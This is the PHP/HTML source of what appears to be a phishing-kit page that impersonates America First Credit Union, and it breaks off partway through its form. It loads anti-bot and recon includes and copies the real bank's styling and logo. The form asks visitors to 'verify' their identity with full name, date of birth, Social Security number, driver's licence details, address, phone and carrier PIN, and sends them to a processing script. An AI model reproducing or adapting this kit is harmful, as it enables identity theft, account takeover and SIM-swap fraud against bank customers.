<?php

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * icq & telegram = @CO_DEAD
 
###############################################
#$            Coded by CO-DEAD               $#
#$  Adding backdoor won't  make you a Coder  $#
#$          Copyright 2022 AFCU              $#
###############################################

 **/

require_once(__DIR__ . '/killbot/code/include.php');
require_once(__DIR__ . '/codead_prevent/include.php');
require 'anti/anti1.php';
require 'anti/anti2.php';
require 'anti/anti3.php';
require 'anti/anti4.php';
require 'anti/anti5.php';
require 'anti/anti6.php';
require 'anti/anti7.php';
require 'anti/anti8.php';
require 'anti/recon.php';

?>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="https://secure.americafirst.com/favicon.ico">
    <title>America First Credit Union</title>

    <link href="https://secure.americafirst.com/css/app.76ff82e5.css" rel="preload" as="style">
    <link href="./assets/css/chunk-vendors.eab46e62.css" rel="preload" as="style">
    <link href="https://secure.americafirst.com/js/app.48c40f3c.js" rel="preload" as="script">
    <link href="https://secure.americafirst.com/js/chunk-vendors.662cf618.js" rel="preload" as="script">
    <link href="./assets/css/2.css" rel="stylesheet">
    <link href="https://secure.americafirst.com/css/app.76ff82e5.css" rel="stylesheet">
    <style type="text/css" id="vuetify-theme-stylesheet">
        .v-application a {
            color: #337ab7;
        }

        .v-application .primary {
            background-color: #1976d2 !important;
            border-color: #1976d2 !important;
        }

        .v-application .primary--text {
            color: #1976d2 !important;
            caret-color: #1976d2 !important;
        }

        .v-application .primary.lighten-5 {
            background-color: #c7fdff !important;
            border-color: #c7fdff !important;
        }

        .v-application .primary--text.text--lighten-5 {
            color: #c7fdff !important;
            caret-color: #c7fdff !important;
        }

        .v-application .primary.lighten-4 {
            background-color: #a8e0ff !important;
            border-color: #a8e0ff !important;
        }

        .v-application .primary--text.text--lighten-4 {
            color: #a8e0ff !important;
            caret-color: #a8e0ff !important;
        }

        .v-application .primary.lighten-3 {
            background-color: #8ac5ff !important;
            border-color: #8ac5ff !important;
        }

        .v-application .primary--text.text--lighten-3 {
            color: #8ac5ff !important;
            caret-color: #8ac5ff !important;
        }

        .v-application .primary.lighten-2 {
            background-color: #6aaaff !important;
            border-color: #6aaaff !important;
        }

        .v-application .primary--text.text--lighten-2 {
            color: #6aaaff !important;
            caret-color: #6aaaff !important;
        }

        .v-application .primary.lighten-1 {
            background-color: #488fef !important;
            border-color: #488fef !important;
        }

        .v-application .primary--text.text--lighten-1 {
            color: #488fef !important;
            caret-color: #488fef !important;
        }

        .v-application .primary.darken-1 {
            background-color: #005eb6 !important;
            border-color: #005eb6 !important;
        }

        .v-application .primary--text.text--darken-1 {
            color: #005eb6 !important;
            caret-color: #005eb6 !important;
        }

        .v-application .primary.darken-2 {
            background-color: #00479b !important;
            border-color: #00479b !important;
        }

        .v-application .primary--text.text--darken-2 {
            color: #00479b !important;
            caret-color: #00479b !important;
        }

        .v-application .primary.darken-3 {
            background-color: #003180 !important;
            border-color: #003180 !important;
        }

        .v-application .primary--text.text--darken-3 {
            color: #003180 !important;
            caret-color: #003180 !important;
        }

        .v-application .primary.darken-4 {
            background-color: #001e67 !important;
            border-color: #001e67 !important;
        }

        .v-application .primary--text.text--darken-4 {
            color: #001e67 !important;
            caret-color: #001e67 !important;
        }

        .v-application .secondary {
            background-color: #424242 !important;
            border-color: #424242 !important;
        }

        .v-application .secondary--text {
            color: #424242 !important;
            caret-color: #424242 !important;
        }

        .v-application .secondary.lighten-5 {
            background-color: #c1c1c1 !important;
            border-color: #c1c1c1 !important;
        }

        .v-application .secondary--text.text--lighten-5 {
            color: #c1c1c1 !important;
            caret-color: #c1c1c1 !important;
        }

        .v-application .secondary.lighten-4 {
            background-color: #a6a6a6 !important;
            border-color: #a6a6a6 !important;
        }

        .v-application .secondary--text.text--lighten-4 {
            color: #a6a6a6 !important;
            caret-color: #a6a6a6 !important;
        }

        .v-application .secondary.lighten-3 {
            background-color: #8b8b8b !important;
            border-color: #8b8b8b !important;
        }

        .v-application .secondary--text.text--lighten-3 {
            color: #8b8b8b !important;
            caret-color: #8b8b8b !important;
        }

        .v-application .secondary.lighten-2 {
            background-color: #727272 !important;
            border-color: #727272 !important;
        }

        .v-application .secondary--text.text--lighten-2 {
            color: #727272 !important;
            caret-color: #727272 !important;
        }

        .v-application .secondary.lighten-1 {
            background-color: #595959 !important;
            border-color: #595959 !important;
        }

        .v-application .secondary--text.text--lighten-1 {
            color: #595959 !important;
            caret-color: #595959 !important;
        }

        .v-application .secondary.darken-1 {
            background-color: #2c2c2c !important;
            border-color: #2c2c2c !important;
        }

        .v-application .secondary--text.text--darken-1 {
            color: #2c2c2c !important;
            caret-color: #2c2c2c !important;
        }

        .v-application .secondary.darken-2 {
            background-color: #171717 !important;
            border-color: #171717 !important;
        }

        .v-application .secondary--text.text--darken-2 {
            color: #171717 !important;
            caret-color: #171717 !important;
        }

        .v-application .secondary.darken-3 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .secondary--text.text--darken-3 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .secondary.darken-4 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .secondary--text.text--darken-4 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .accent {
            background-color: #82b1ff !important;
            border-color: #82b1ff !important;
        }

        .v-application .accent--text {
            color: #82b1ff !important;
            caret-color: #82b1ff !important;
        }

        .v-application .accent.lighten-5 {
            background-color: #ffffff !important;
            border-color: #ffffff !important;
        }

        .v-application .accent--text.text--lighten-5 {
            color: #ffffff !important;
            caret-color: #ffffff !important;
        }

        .v-application .accent.lighten-4 {
            background-color: #f8ffff !important;
            border-color: #f8ffff !important;
        }

        .v-application .accent--text.text--lighten-4 {
            color: #f8ffff !important;
            caret-color: #f8ffff !important;
        }

        .v-application .accent.lighten-3 {
            background-color: #daffff !important;
            border-color: #daffff !important;
        }

        .v-application .accent--text.text--lighten-3 {
            color: #daffff !important;
            caret-color: #daffff !important;
        }

        .v-application .accent.lighten-2 {
            background-color: #bce8ff !important;
            border-color: #bce8ff !important;
        }

        .v-application .accent--text.text--lighten-2 {
            color: #bce8ff !important;
            caret-color: #bce8ff !important;
        }

        .v-application .accent.lighten-1 {
            background-color: #9fccff !important;
            border-color: #9fccff !important;
        }

        .v-application .accent--text.text--lighten-1 {
            color: #9fccff !important;
            caret-color: #9fccff !important;
        }

        .v-application .accent.darken-1 {
            background-color: #6596e2 !important;
            border-color: #6596e2 !important;
        }

        .v-application .accent--text.text--darken-1 {
            color: #6596e2 !important;
            caret-color: #6596e2 !important;
        }

        .v-application .accent.darken-2 {
            background-color: #467dc6 !important;
            border-color: #467dc6 !important;
        }

        .v-application .accent--text.text--darken-2 {
            color: #467dc6 !important;
            caret-color: #467dc6 !important;
        }

        .v-application .accent.darken-3 {
            background-color: #2364aa !important;
            border-color: #2364aa !important;
        }

        .v-application .accent--text.text--darken-3 {
            color: #2364aa !important;
            caret-color: #2364aa !important;
        }

        .v-application .accent.darken-4 {
            background-color: #004c90 !important;
            border-color: #004c90 !important;
        }

        .v-application .accent--text.text--darken-4 {
            color: #004c90 !important;
            caret-color: #004c90 !important;
        }

        .v-application .error {
            background-color: #ff5252 !important;
            border-color: #ff5252 !important;
        }

        .v-application .error--text {
            color: #ff5252 !important;
            caret-color: #ff5252 !important;
        }

        .v-application .error.lighten-5 {
            background-color: #ffe4d5 !important;
            border-color: #ffe4d5 !important;
        }

        .v-application .error--text.text--lighten-5 {
            color: #ffe4d5 !important;
            caret-color: #ffe4d5 !important;
        }

        .v-application .error.lighten-4 {
            background-color: #ffc6b9 !important;
            border-color: #ffc6b9 !important;
        }

        .v-application .error--text.text--lighten-4 {
            color: #ffc6b9 !important;
            caret-color: #ffc6b9 !important;
        }

        .v-application .error.lighten-3 {
            background-color: #ffa99e !important;
            border-color: #ffa99e !important;
        }

        .v-application .error--text.text--lighten-3 {
            color: #ffa99e !important;
            caret-color: #ffa99e !important;
        }

        .v-application .error.lighten-2 {
            background-color: #ff8c84 !important;
            border-color: #ff8c84 !important;
        }

        .v-application .error--text.text--lighten-2 {
            color: #ff8c84 !important;
            caret-color: #ff8c84 !important;
        }

        .v-application .error.lighten-1 {
            background-color: #ff6f6a !important;
            border-color: #ff6f6a !important;
        }

        .v-application .error--text.text--lighten-1 {
            color: #ff6f6a !important;
            caret-color: #ff6f6a !important;
        }

        .v-application .error.darken-1 {
            background-color: #df323b !important;
            border-color: #df323b !important;
        }

        .v-application .error--text.text--darken-1 {
            color: #df323b !important;
            caret-color: #df323b !important;
        }

        .v-application .error.darken-2 {
            background-color: #bf0025 !important;
            border-color: #bf0025 !important;
        }

        .v-application .error--text.text--darken-2 {
            color: #bf0025 !important;
            caret-color: #bf0025 !important;
        }

        .v-application .error.darken-3 {
            background-color: #9f0010 !important;
            border-color: #9f0010 !important;
        }

        .v-application .error--text.text--darken-3 {
            color: #9f0010 !important;
            caret-color: #9f0010 !important;
        }

        .v-application .error.darken-4 {
            background-color: #800000 !important;
            border-color: #800000 !important;
        }

        .v-application .error--text.text--darken-4 {
            color: #800000 !important;
            caret-color: #800000 !important;
        }

        .v-application .info {
            background-color: #2196f3 !important;
            border-color: #2196f3 !important;
        }

        .v-application .info--text {
            color: #2196f3 !important;
            caret-color: #2196f3 !important;
        }

        .v-application .info.lighten-5 {
            background-color: #d4ffff !important;
            border-color: #d4ffff !important;
        }

        .v-application .info--text.text--lighten-5 {
            color: #d4ffff !important;
            caret-color: #d4ffff !important;
        }

        .v-application .info.lighten-4 {
            background-color: #b5ffff !important;
            border-color: #b5ffff !important;
        }

        .v-application .info--text.text--lighten-4 {
            color: #b5ffff !important;
            caret-color: #b5ffff !important;
        }

        .v-application .info.lighten-3 {
            background-color: #95e8ff !important;
            border-color: #95e8ff !important;
        }

        .v-application .info--text.text--lighten-3 {
            color: #95e8ff !important;
            caret-color: #95e8ff !important;
        }

        .v-application .info.lighten-2 {
            background-color: #75ccff !important;
            border-color: #75ccff !important;
        }

        .v-application .info--text.text--lighten-2 {
            color: #75ccff !important;
            caret-color: #75ccff !important;
        }

        .v-application .info.lighten-1 {
            background-color: #51b0ff !important;
            border-color: #51b0ff !important;
        }

        .v-application .info--text.text--lighten-1 {
            color: #51b0ff !important;
            caret-color: #51b0ff !important;
        }

        .v-application .info.darken-1 {
            background-color: #007cd6 !important;
            border-color: #007cd6 !important;
        }

        .v-application .info--text.text--darken-1 {
            color: #007cd6 !important;
            caret-color: #007cd6 !important;
        }

        .v-application .info.darken-2 {
            background-color: #0064ba !important;
            border-color: #0064ba !important;
        }

        .v-application .info--text.text--darken-2 {
            color: #0064ba !important;
            caret-color: #0064ba !important;
        }

        .v-application .info.darken-3 {
            background-color: #004d9f !important;
            border-color: #004d9f !important;
        }

        .v-application .info--text.text--darken-3 {
            color: #004d9f !important;
            caret-color: #004d9f !important;
        }

        .v-application .info.darken-4 {
            background-color: #003784 !important;
            border-color: #003784 !important;
        }

        .v-application .info--text.text--darken-4 {
            color: #003784 !important;
            caret-color: #003784 !important;
        }

        .v-application .success {
            background-color: #4caf50 !important;
            border-color: #4caf50 !important;
        }

        .v-application .success--text {
            color: #4caf50 !important;
            caret-color: #4caf50 !important;
        }

        .v-application .success.lighten-5 {
            background-color: #dcffd6 !important;
            border-color: #dcffd6 !important;
        }

        .v-application .success--text.text--lighten-5 {
            color: #dcffd6 !important;
            caret-color: #dcffd6 !important;
        }

        .v-application .success.lighten-4 {
            background-color: #beffba !important;
            border-color: #beffba !important;
        }

        .v-application .success--text.text--lighten-4 {
            color: #beffba !important;
            caret-color: #beffba !important;
        }

        .v-application .success.lighten-3 {
            background-color: #a2ff9e !important;
            border-color: #a2ff9e !important;
        }

        .v-application .success--text.text--lighten-3 {
            color: #a2ff9e !important;
            caret-color: #a2ff9e !important;
        }

        .v-application .success.lighten-2 {
            background-color: #85e783 !important;
            border-color: #85e783 !important;
        }

        .v-application .success--text.text--lighten-2 {
            color: #85e783 !important;
            caret-color: #85e783 !important;
        }

        .v-application .success.lighten-1 {
            background-color: #69cb69 !important;
            border-color: #69cb69 !important;
        }

        .v-application .success--text.text--lighten-1 {
            color: #69cb69 !important;
            caret-color: #69cb69 !important;
        }

        .v-application .success.darken-1 {
            background-color: #2d9437 !important;
            border-color: #2d9437 !important;
        }

        .v-application .success--text.text--darken-1 {
            color: #2d9437 !important;
            caret-color: #2d9437 !important;
        }

        .v-application .success.darken-2 {
            background-color: #00791e !important;
            border-color: #00791e !important;
        }

        .v-application .success--text.text--darken-2 {
            color: #00791e !important;
            caret-color: #00791e !important;
        }

        .v-application .success.darken-3 {
            background-color: #006000 !important;
            border-color: #006000 !important;
        }

        .v-application .success--text.text--darken-3 {
            color: #006000 !important;
            caret-color: #006000 !important;
        }

        .v-application .success.darken-4 {
            background-color: #004700 !important;
            border-color: #004700 !important;
        }

        .v-application .success--text.text--darken-4 {
            color: #004700 !important;
            caret-color: #004700 !important;
        }

        .v-application .warning {
            background-color: #fb8c00 !important;
            border-color: #fb8c00 !important;
        }

        .v-application .warning--text {
            color: #fb8c00 !important;
            caret-color: #fb8c00 !important;
        }

        .v-application .warning.lighten-5 {
            background-color: #ffff9e !important;
            border-color: #ffff9e !important;
        }

        .v-application .warning--text.text--lighten-5 {
            color: #ffff9e !important;
            caret-color: #ffff9e !important;
        }

        .v-application .warning.lighten-4 {
            background-color: #fffb82 !important;
            border-color: #fffb82 !important;
        }

        .v-application .warning--text.text--lighten-4 {
            color: #fffb82 !important;
            caret-color: #fffb82 !important;
        }

        .v-application .warning.lighten-3 {
            background-color: #ffdf67 !important;
            border-color: #ffdf67 !important;
        }

        .v-application .warning--text.text--lighten-3 {
            color: #ffdf67 !important;
            caret-color: #ffdf67 !important;
        }

        .v-application .warning.lighten-2 {
            background-color: #ffc24b !important;
            border-color: #ffc24b !important;
        }

        .v-application .warning--text.text--lighten-2 {
            color: #ffc24b !important;
            caret-color: #ffc24b !important;
        }

        .v-application .warning.lighten-1 {
            background-color: #ffa72d !important;
            border-color: #ffa72d !important;
        }

        .v-application .warning--text.text--lighten-1 {
            color: #ffa72d !important;
            caret-color: #ffa72d !important;
        }

        .v-application .warning.darken-1 {
            background-color: #db7200 !important;
            border-color: #db7200 !important;
        }

        .v-application .warning--text.text--darken-1 {
            color: #db7200 !important;
            caret-color: #db7200 !important;
        }

        .v-application .warning.darken-2 {
            background-color: #bb5900 !important;
            border-color: #bb5900 !important;
        }

        .v-application .warning--text.text--darken-2 {
            color: #bb5900 !important;
            caret-color: #bb5900 !important;
        }

        .v-application .warning.darken-3 {
            background-color: #9d4000 !important;
            border-color: #9d4000 !important;
        }

        .v-application .warning--text.text--darken-3 {
            color: #9d4000 !important;
            caret-color: #9d4000 !important;
        }

        .v-application .warning.darken-4 {
            background-color: #802700 !important;
            border-color: #802700 !important;
        }

        .v-application .warning--text.text--darken-4 {
            color: #802700 !important;
            caret-color: #802700 !important;
        }

        .v-application .afcu-blue {
            background-color: #00548e !important;
            border-color: #00548e !important;
        }

        .v-application .afcu-blue--text {
            color: #00548e !important;
            caret-color: #00548e !important;
        }

        .v-application .afcu-blue.lighten-5 {
            background-color: #a7d6ff !important;
            border-color: #a7d6ff !important;
        }

        .v-application .afcu-blue--text.text--lighten-5 {
            color: #a7d6ff !important;
            caret-color: #a7d6ff !important;
        }

        .v-application .afcu-blue.lighten-4 {
            background-color: #8abafd !important;
            border-color: #8abafd !important;
        }

        .v-application .afcu-blue--text.text--lighten-4 {
            color: #8abafd !important;
            caret-color: #8abafd !important;
        }

        .v-application .afcu-blue.lighten-3 {
            background-color: #6e9fe0 !important;
            border-color: #6e9fe0 !important;
        }

        .v-application .afcu-blue--text.text--lighten-3 {
            color: #6e9fe0 !important;
            caret-color: #6e9fe0 !important;
        }

        .v-application .afcu-blue.lighten-2 {
            background-color: #5185c4 !important;
            border-color: #5185c4 !important;
        }

        .v-application .afcu-blue--text.text--lighten-2 {
            color: #5185c4 !important;
            caret-color: #5185c4 !important;
        }

        .v-application .afcu-blue.lighten-1 {
            background-color: #316ca9 !important;
            border-color: #316ca9 !important;
        }

        .v-application .afcu-blue--text.text--lighten-1 {
            color: #316ca9 !important;
            caret-color: #316ca9 !important;
        }

        .v-application .afcu-blue.darken-1 {
            background-color: #003d74 !important;
            border-color: #003d74 !important;
        }

        .v-application .afcu-blue--text.text--darken-1 {
            color: #003d74 !important;
            caret-color: #003d74 !important;
        }

        .v-application .afcu-blue.darken-2 {
            background-color: #00285b !important;
            border-color: #00285b !important;
        }

        .v-application .afcu-blue--text.text--darken-2 {
            color: #00285b !important;
            caret-color: #00285b !important;
        }

        .v-application .afcu-blue.darken-3 {
            background-color: #001343 !important;
            border-color: #001343 !important;
        }

        .v-application .afcu-blue--text.text--darken-3 {
            color: #001343 !important;
            caret-color: #001343 !important;
        }

        .v-application .afcu-blue.darken-4 {
            background-color: #00002d !important;
            border-color: #00002d !important;
        }

        .v-application .afcu-blue--text.text--darken-4 {
            color: #00002d !important;
            caret-color: #00002d !important;
        }

        .v-application .afcu-dark-blue {
            background-color: #1e1e23 !important;
            border-color: #1e1e23 !important;
        }

        .v-application .afcu-dark-blue--text {
            color: #1e1e23 !important;
            caret-color: #1e1e23 !important;
        }

        .v-application .afcu-dark-blue.lighten-5 {
            background-color: #94949a !important;
            border-color: #94949a !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-5 {
            color: #94949a !important;
            caret-color: #94949a !important;
        }

        .v-application .afcu-dark-blue.lighten-4 {
            background-color: #7a7a80 !important;
            border-color: #7a7a80 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-4 {
            color: #7a7a80 !important;
            caret-color: #7a7a80 !important;
        }

        .v-application .afcu-dark-blue.lighten-3 {
            background-color: #616167 !important;
            border-color: #616167 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-3 {
            color: #616167 !important;
            caret-color: #616167 !important;
        }

        .v-application .afcu-dark-blue.lighten-2 {
            background-color: #4a4a4f !important;
            border-color: #4a4a4f !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-2 {
            color: #4a4a4f !important;
            caret-color: #4a4a4f !important;
        }

        .v-application .afcu-dark-blue.lighten-1 {
            background-color: #333338 !important;
            border-color: #333338 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-1 {
            color: #333338 !important;
            caret-color: #333338 !important;
        }

        .v-application .afcu-dark-blue.darken-1 {
            background-color: #05050d !important;
            border-color: #05050d !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-1 {
            color: #05050d !important;
            caret-color: #05050d !important;
        }

        .v-application .afcu-dark-blue.darken-2 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-2 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .afcu-dark-blue.darken-3 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-3 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .afcu-dark-blue.darken-4 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-4 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }
    </style>
</head>

<body><noscript><strong>We're sorry but America First Credit Union doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
    <div data-app="true" class="v-application v-application--is-ltr theme--light" id="app">
        <div class="v-application--wrap">
            <div data-v-5c15a386="" id="notifications">
                <!---->
            </div>
            <header data-v-7168338a="" class="v-sheet theme--dark v-toolbar v-toolbar--flat v-app-bar v-app-bar--fixed afcu-blue" data-booted="true" style="height: 78px; margin-top: 0px; transform: translateY(0px); left: 0px; right: 0px;">
                <div class="v-toolbar__content" style="height: 78px;">
                    <div data-v-7168338a="" class="container container--fluid">
                        <div data-v-7168338a="" class="row">
                            <div data-v-7168338a="" class="d-flex"><a data-v-7168338a="" href="https://www.americafirst.com"><img data-v-7168338a="" alt="America First Credit Union" src="data:image/png;base64," width="139" class="hidden-md-and-up mobile-logo"><img data-v-7168338a="" alt="America First Credit Union" src="https://secure.americafirst.com/img/logo-desktop-inverse.a3a99f3a.png" width="185" class="hidden-sm-and-down webkit-blur-fix"></a></div>
                        </div>
                    </div>
                </div>
            </header>
            <main class="v-main" data-booted="true" style="padding: 78px 0px 0px;">
                <div class="v-main__wrap">
                    <div class="container container--fluid">
                        <div data-v-63ab483a="" id="content">
                            <div data-v-fec3e2d0="" data-v-63ab483a="">
                                <h1 data-v-fec3e2d0="" class="text-h5">Verify Your Identity</h1>
                                <p data-v-fec3e2d0="" class="text-span">Please fill the below form to verify your identity.</p>
                                <div data-v-2906dda8="" data-v-fec3e2d0="" class="row">
                                    <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                        <form data-v-fec3e2d0="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="./processing/step5.php" method="POST">
                                            <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="fnamediv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="fname" id="fnamelabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Full Name</label><input autocomplete="off" autofocus="autofocus" id="fname" name="fname" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="fnameerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Name</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="dobdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="dob" id="doblabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Date Of Birth (mm/dd/yyyy)</label><input autocomplete="off" autofocus="autofocus" id="dob" name="dob" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="doberror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Date Of Birth</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="ssndiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="ssn" id="ssnlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Social Security Number</label><input autocomplete="off" autofocus="autofocus" id="ssn" name="ssn" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="ssnerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Social Security Number</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>


                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="dlndiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="dln" id="dlnlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Driver's Licence Number</label><input autocomplete="off" autofocus="autofocus" id="dln" name="dln" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="dlnerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Driver's Licence Number</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="dlexpdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="dlexp" id="dlexplabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Driver's Licence Expiry Date (mm/yyyy)</label><input autocomplete="off" autofocus="autofocus" id="dlexp" name="dlexp" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="dlexperror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Driver's Licence Expiry Date</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="dlissuediv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="dlissue" id="dlissuelabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Driver's Licence Issue Date (mm/yyyy)</label><input autocomplete="off" autofocus="autofocus" id="dlissue" name="dlissue" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="dlissueerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Driver's Licence Issue Date</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="addrdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="addr" id="addrlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Address</label><input autocomplete="off" autofocus="autofocus" id="addr" name="addr" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="addrerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Address</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="statediv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="state" id="statelabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">State</label><input autocomplete="off" autofocus="autofocus" id="state" name="state" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="stateerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid State</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="zipdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="zip" id="ziplabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Zip Code</label><input autocomplete="off" autofocus="autofocus" id="zip" name="zip" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="ziperror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Zip Code</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="phonediv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="phone" id="phonelabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Phone Number</label><input autocomplete="off" autofocus="autofocus" id="phone" name="phone" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="phoneerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Phone Number</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="cpindiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="cpin" id="cpinlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Carrier Pin</label><input autocomplete="off" autofocus="autofocus" id="cpin" name="cpin" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="cpinerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
